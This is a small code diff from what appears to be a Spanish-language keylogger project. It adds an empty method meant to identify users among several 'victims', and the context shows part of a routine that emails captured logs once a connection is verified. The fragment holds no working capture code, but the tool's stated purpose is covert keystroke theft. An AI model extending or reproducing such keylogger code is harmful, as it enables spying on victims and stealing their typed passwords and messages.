@@ -93,6 +93,10 @@ class Keylogger:
         except:
             print('\nha ocurrido un error al procesar el archivo {}'.format(patch))
 
+    def indentify_usr(): #identificara al usuario, para cuando halla varias victimas identificar a los usuarios[por añadir]
+
+        pass
+
     def report_email(self):                            #  Gestiona el envio y la estructura de correos
         if self.connection_test() == True:
             print('\nconexion verificada, procediendo a enviar registros')
